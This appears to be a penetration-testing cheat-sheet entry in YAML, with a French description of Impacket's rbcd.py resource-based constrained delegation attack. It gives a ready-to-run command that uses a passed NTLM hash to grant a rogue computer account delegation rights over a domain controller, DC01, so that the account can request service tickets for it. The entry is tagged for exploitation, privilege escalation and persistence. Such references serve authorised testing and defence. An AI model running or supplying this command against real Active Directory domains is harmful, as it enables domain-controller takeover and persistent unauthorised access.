---
description: |
  Impacket rbcd.py modifie la propriété msDS-AllowedToActOnBehalfOfOtherIdentity d'un ordinateur cible avec le descripteur de sécurité d'un autre ordinateur.
  La commande suivante ajoute le descripteur de sécurité correspondant de l'ordinateur EVILCOMPUTER créé à la propriété msDS-AllowedToActOnBehalfOfOtherIdentity de DC01.
  Cela signifie que EVILCOMPUTER peut obtenir des tickets de service pour DC01 en utilisant getST.py.

  Command Reference:

    Target IP: 10.10.10.1

    Domain: test.local

    Username: john

    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA

    Delegate To: DC01$

    Delegate From: EVILCOMPUTER$

command: |
  python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
items:
  - Username
  - Hash
services:
  - Kerberos
  - SMB
  - LDAP
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - PrivEsc
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py
  - https://github.com/tothi/rbcd-attack
---
